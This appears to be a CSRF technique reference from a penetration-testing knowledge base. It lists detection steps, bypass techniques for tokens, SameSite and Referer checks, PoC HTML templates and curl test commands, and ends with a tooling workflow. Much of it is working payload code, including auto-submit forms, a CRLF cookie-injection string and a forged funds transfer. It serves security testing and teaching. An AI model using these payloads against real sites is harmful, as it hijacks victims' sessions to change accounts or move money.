---
id: PS-CSRF
category: Cross-site request forgery (CSRF)
lab_count: 12
wstg_refs: [WSTG-SESS-05]
---

# CSRF: Attack Technique Reference

Cross-Site Request Forgery forces an authenticated user's browser to submit a forged request to a vulnerable application. The attack succeeds when three conditions are met: (1) a relevant state-changing action exists, (2) the application relies solely on cookies for session handling, and (3) request parameters are predictable with no anti-CSRF token or equivalent defense. The attacker hosts a malicious page that auto-submits a crafted request using the victim's authenticated session.

---

## 1. Detection

### 1A. Identify State-Changing Endpoints

Map every endpoint that modifies server-side state:

- **Account management:** email change, password change, profile update, account deletion
- **Data modification:** create/update/delete operations on any resource
- **Administrative actions:** user role changes, configuration updates, privilege grants
- **Financial operations:** transfers, purchases, subscription changes

For each endpoint, record: HTTP method, all parameters, and whether any parameter looks unpredictable (tokens, nonces).

### 1B. Analyze CSRF Token Presence

For each state-changing endpoint, check for anti-CSRF defenses:

```bash
# Fetch a page with a form and look for hidden token fields
curl -sk -D- https://target.com/my-account | grep -i 'csrf\|token\|_token\|authenticity'

# Check if the response sets a CSRF cookie
curl -sk -D- https://target.com/my-account | grep -i 'set-cookie.*csrf'
```

Look for:
- Hidden form fields: `csrf`, `_csrf`, `token`, `_token`, `authenticity_token`, `__RequestVerificationToken`
- Custom request headers: `X-CSRF-Token`, `X-XSRF-TOKEN`
- Double-submit cookies: cookie value matching a form parameter

### 1C. Analyze SameSite Cookie Attributes

```bash
# Inspect Set-Cookie headers for SameSite attribute
curl -sk -D- https://target.com/login -X POST -d 'username=test&password=test' | grep -i 'set-cookie'
```

Classify each session cookie:
- **SameSite=Strict**: Cookie never sent on cross-site requests (hardest to bypass)
- **SameSite=Lax**: Cookie sent on top-level GET navigations but not on cross-site POST/iframe/XHR (Chrome default since 2020)
- **SameSite=None**: Cookie always sent cross-site (requires Secure flag; fully vulnerable)
- **No SameSite attribute**: Browser applies Lax by default in Chromium browsers, but older browsers treat as None

### 1D. Analyze Referer Validation

```bash
# Send a request with no Referer header
curl -sk -X POST https://target.com/my-account/change-email \
  -H "Cookie: session=abc123" \
  -H "Referer: " \
  -d "email=test@evil.com&csrf=TOKEN"

# Send with a manipulated Referer containing the target domain as a substring
curl -sk -X POST https://target.com/my-account/change-email \
  -H "Cookie: session=abc123" \
  -H "Referer: https://attacker.com/csrf?target.com" \
  -d "email=test@evil.com&csrf=TOKEN"
```

---

## 2. Techniques

### 2A. No CSRF Defense

The endpoint has no token, no SameSite restriction, and no Referer check. Craft a simple auto-submitting form.

**PoC:**
```html
<html>
<body>
<form action="https://target.com/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

**Detection:** Action succeeds when the form is submitted from an attacker-controlled origin.

> Lab refs: PS-CSRF-01

### 2B. Token Validation Depends on Request Method

The server only validates the CSRF token on POST requests. Switching to GET bypasses validation entirely.

**Steps:**
1. Identify a POST endpoint with a CSRF token (e.g., `POST /my-account/change-email`)
2. Replay the same request as GET with parameters in the query string
3. Omit the CSRF token parameter from the GET request
4. If the action succeeds, the server skips validation for GET

**PoC:**
```html
<img src="https://target.com/my-account/change-email?email=attacker@evil.com" />
```

> Lab refs: PS-CSRF-02

### 2C. Token Validation Depends on Token Being Present

The server validates the token when it is present but skips validation entirely when the parameter is omitted.

**Steps:**
1. Intercept a legitimate request with its CSRF token
2. Remove the entire token parameter (not just the value -- remove the parameter name too)
3. Submit the request without any token field
4. If the action succeeds, the server only checks tokens it receives

**PoC:**
```html
<form action="https://target.com/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <!-- csrf parameter intentionally omitted -->
</form>
<script>document.forms[0].submit();</script>
```

> Lab refs: PS-CSRF-03

### 2D. Token Not Tied to User Session

The application maintains a global pool of valid tokens rather than binding each token to a specific user session. Any valid token works for any user.

**Steps:**
1. Log in with an attacker-controlled account
2. Extract a valid CSRF token from the response
3. Use that token in the CSRF payload targeting the victim
4. The server accepts it because it belongs to the global pool

**PoC:**
```html
<form action="https://target.com/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf" value="ATTACKER_VALID_TOKEN" />
</form>
<script>document.forms[0].submit();</script>
```

> Lab refs: PS-CSRF-04

### 2E. Token Tied to Non-Session Cookie

The CSRF token is validated against a dedicated CSRF cookie (not the session cookie). If an attacker can inject a cookie into the victim's browser (via a cookie-setting gadget on the same domain or a subdomain), they can plant their own CSRF cookie and use the matching token.

**Steps:**
1. Log in with attacker account, capture the `csrfKey` cookie and matching `csrf` token
2. Find a cookie-injection vector: subdomain XSS, header injection, or CRLF injection on the target domain
3. Inject the attacker's `csrfKey` cookie into the victim's browser
4. Submit the CSRF form with the attacker's matching `csrf` token

**Cookie injection via subdomain or search functionality:**
```html
<img src="https://target.com/search?q=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()"/>
```

> Lab refs: PS-CSRF-05, PS-CSRF-06

### 2F. SameSite Lax Bypass via Method Override

When SameSite=Lax is in effect, cross-site POST requests will not include the session cookie. However, if the server supports method override parameters (`_method`, `X-HTTP-Method-Override`), a GET request can be processed as POST server-side while the browser treats it as GET (and sends Lax cookies).

**Steps:**
1. Confirm the server framework supports `_method` parameter (common in Symfony, Laravel, Rails)
2. Convert the POST request to a GET with `_method=POST` in the query string
3. The browser sends a GET request (includes Lax cookies) but the server interprets it as POST

**PoC:**
```html
<script>
  document.location = 'https://target.com/my-account/change-email?email=attacker@evil.com&_method=POST';
</script>
```

> Lab refs: PS-CSRF-07

### 2G. SameSite Strict Bypass via Client-Side Redirect

SameSite=Strict blocks cookies on all cross-site requests. However, if the target site has a client-side redirect gadget (e.g., a confirmation page that redirects based on a URL parameter), the redirect creates a same-site request that includes Strict cookies.

**Steps:**
1. Identify a page on the target site that performs a client-side redirect using user-controllable input (e.g., `/post/comment/confirmation?postId=X/../my-account`)
2. Craft a URL that chains through the redirect gadget to the vulnerable state-changing endpoint
3. The initial navigation is cross-site (no cookies), but the client-side redirect is same-site (cookies included)

**PoC:**
```html
<script>
  document.location = 'https://target.com/post/comment/confirmation?postId=1/../../my-account/change-email?email=attacker@evil.com%26submit=1';
</script>
```

**Key insight:** The browser treats the redirected request as a standalone same-site request, not part of a cross-site flow.

> Lab refs: PS-CSRF-08

### 2H. SameSite Strict Bypass via Sibling Domain

A request from one subdomain to another on the same registrable domain (same eTLD+1) is considered same-site. If an attacker finds XSS or another exploitable vulnerability on a sibling domain, they can use it to forge requests that carry Strict cookies.

**Steps:**
1. Identify a sibling domain with a vulnerability (e.g., XSS on `cms.target.com` or WebSocket CSWSH on `ws.target.com`)
2. Use the sibling domain vulnerability to issue requests to the primary domain (`www.target.com`)
3. Because both are under `target.com`, the browser treats the request as same-site and includes Strict cookies

**Attack path with WebSocket on sibling:**
```html
<!-- From attacker page, inject via XSS on sibling -->
<script>
var ws = new WebSocket('wss://cms.target.com/chat');
ws.onopen = function() {
  ws.send('CSRF payload targeting www.target.com');
};
</script>
```

> Lab refs: PS-CSRF-09

### 2I. SameSite Lax Bypass via Cookie Refresh

Chrome enforces a 120-second grace period for newly issued cookies that lack an explicit SameSite attribute. During this window, top-level POST requests from cross-site contexts will include the cookie (treated as None rather than Lax).

**Steps:**
1. Trigger a fresh cookie issuance -- OAuth login flows are ideal because they set new session cookies via a top-level redirect
2. Immediately (within 120 seconds) submit the CSRF attack as a top-level POST
3. The newly set cookie has not yet been enforced as Lax, so it is sent cross-site

**PoC pattern:**
```html
<form method="POST" action="https://target.com/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>
  // First open a popup to trigger OAuth re-login (refreshes the cookie)
  window.open('https://target.com/login/oauth');
  // Then submit the CSRF within the 120-second window
  setTimeout(function(){ document.forms[0].submit(); }, 3000);
</script>
```

> Lab refs: PS-CSRF-10

### 2J. Referer Header Suppression

The application validates the Referer header only when it is present. Suppressing the header entirely bypasses the check.

**PoC (suppress Referer with meta tag):**
```html
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body>
<form action="https://target.com/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

> Lab refs: PS-CSRF-11

### 2K. Referer Header Domain Validation Bypass

The application checks that the Referer header contains the target domain but uses a weak substring match rather than strict origin comparison.

**Bypass 1 -- Target domain in subdomain of attacker site:**
```
http://target.com.attacker.com/csrf
```
Works when validation checks if the Referer starts with the expected domain.

**Bypass 2 -- Target domain in query string:**
```
http://attacker.com/csrf?target.com
```
Works when validation checks if the Referer contains the target domain anywhere.

**Important:** Modern browsers strip query strings from Referer by default. Force the full URL to be sent:
```html
<html>
<head>
  <meta name="referrer" content="unsafe-url">
</head>
<body>
<form action="https://target.com/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>
  history.pushState("", "", "/?target.com");
  document.forms[0].submit();
</script>
</body>
</html>
```

The `history.pushState` call embeds the target domain in the attacker page's URL, which then appears in the Referer header.

> Lab refs: PS-CSRF-12

---

## 3. CSRF PoC Templates

### 3A. Auto-Submit Form (POST)

The standard CSRF PoC. Works for any POST-based state-changing endpoint without adequate protection.

```html
<html>
<body>
<form action="https://target.com/endpoint" method="POST">
  <input type="hidden" name="param1" value="value1" />
  <input type="hidden" name="param2" value="value2" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

### 3B. GET-Based (Image Tag)

For state-changing GET endpoints. The browser fires the request when loading the image.

```html
<img src="https://target.com/endpoint?param1=value1&param2=value2" width="0" height="0" />
```

### 3C. XHR/Fetch-Based

For endpoints requiring custom headers or JSON content types (limited by CORS preflight):

```html
<script>
fetch('https://target.com/api/endpoint', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: '{"email":"attacker@evil.com"}'
});
</script>
```

**Note:** `Content-Type: text/plain` avoids CORS preflight. If the server requires `application/json`, a preflight OPTIONS request is sent and CSRF fails unless the server has a permissive CORS policy.

### 3D. Hidden Iframe (Silent Execution)

Executes the CSRF without navigating the victim away from the current page:

```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form action="https://target.com/endpoint" method="POST" target="csrf-frame">
  <input type="hidden" name="param1" value="value1" />
</form>
<script>document.forms[0].submit();</script>
```

### 3E. Multi-Step CSRF

For actions requiring multiple sequential requests (e.g., confirmation dialogs):

```html
<script>
// Step 1: Initiate the action
fetch('https://target.com/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'amount=1000&recipient=attacker'
}).then(function() {
  // Step 2: Confirm the action
  fetch('https://target.com/transfer/confirm', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'confirm=yes'
  });
});
</script>
```

---

## 4. Testing Checklist

For every state-changing endpoint discovered during reconnaissance, execute this sequence:

```
State-changing endpoint found?
├── Check 1: Is a CSRF token present in the request?
│   ├── NO → Vulnerable (2A). Build auto-submit form PoC.
│   └── YES → Proceed to token bypass tests
│       ├── Check 2: Remove the token parameter entirely → Does the action succeed? (2C)
│       ├── Check 3: Change POST to GET, omit token → Does it succeed? (2B)
│       ├── Check 4: Use a token from a different user session → Does it succeed? (2D)
│       └── Check 5: Is the token tied to a non-session cookie? → Cookie injection possible? (2E)
│
├── Check 6: Inspect SameSite cookie attribute
│   ├── SameSite=None → Standard CSRF applies (no cookie barrier)
│   ├── SameSite=Lax (or default)
│   │   ├── Does the server support _method override? (2F)
│   │   ├── Is there an OAuth flow that refreshes cookies? (2I)
│   │   └── Can the action be performed via GET? (2B)
│   └── SameSite=Strict
│       ├── Is there a client-side redirect gadget on the target? (2G)
│       └── Is there an exploitable sibling domain? (2H)
│
├── Check 7: Is Referer header validated?
│   ├── Suppress the header entirely with <meta name="referrer" content="no-referrer"> (2J)
│   └── Include target domain as substring in attacker URL (2K)
│
└── Check 8: Is a custom header required (e.g., X-Requested-With)?
    ├── Can the header be added in a simple CORS request? Usually NO.
    └── Is there a CORS misconfiguration allowing the attacker origin? If so, XHR CSRF is possible.
```

### Per-Endpoint Verification Commands

```bash
# 1. Baseline: legitimate request with token
curl -sk -X POST https://target.com/endpoint \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "email=legitimate@test.com&csrf=VALID_TOKEN"

# 2. Token removal
curl -sk -X POST https://target.com/endpoint \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "email=attacker@evil.com"

# 3. Method switch (POST to GET)
curl -sk "https://target.com/endpoint?email=attacker@evil.com" \
  -H "Cookie: session=VICTIM_SESSION"

# 4. Token from different session
curl -sk -X POST https://target.com/endpoint \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "email=attacker@evil.com&csrf=ATTACKER_TOKEN"

# 5. Empty token value
curl -sk -X POST https://target.com/endpoint \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "email=attacker@evil.com&csrf="

# 6. Referer suppression
curl -sk -X POST https://target.com/endpoint \
  -H "Cookie: session=VICTIM_SESSION" \
  -H "Referer: " \
  -d "email=attacker@evil.com&csrf=VALID_TOKEN"

# 7. Referer spoofing (domain in query string)
curl -sk -X POST https://target.com/endpoint \
  -H "Cookie: session=VICTIM_SESSION" \
  -H "Referer: https://attacker.com/page?target.com" \
  -d "email=attacker@evil.com&csrf=VALID_TOKEN"
```

---

## 5. Quick Reference: CSRF Decision Tree

```
Endpoint performs state-changing action?
├── YES
│   ├── CSRF token present?
│   │   ├── NO → VULNERABLE (PoC: auto-submit form)
│   │   └── YES
│   │       ├── Token validated? (remove it, use other user's, empty it)
│   │       │   ├── Bypass found → VULNERABLE
│   │       │   └── Token properly validated
│   │       │       ├── SameSite=None? → Token bypass needed, but cookie barrier absent
│   │       │       ├── SameSite=Lax? → Try method override, cookie refresh
│   │       │       └── SameSite=Strict? → Try client-side redirect, sibling domain
│   │       └── Token tied to non-session cookie? → Cookie injection + token reuse
│   ├── Only Referer-based defense?
│   │   ├── Suppress header → VULNERABLE
│   │   └── Weak domain check → VULNERABLE via substring/query injection
│   └── Custom header required?
│       ├── CORS allows attacker origin? → XHR CSRF possible
│       └── CORS properly restricted → NOT VULNERABLE via CSRF
└── NO → Not a CSRF target
```
## Rynix workflow

1. `get_technique_guide` for `csrf` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `compare_role_response`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `compare_role_response`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

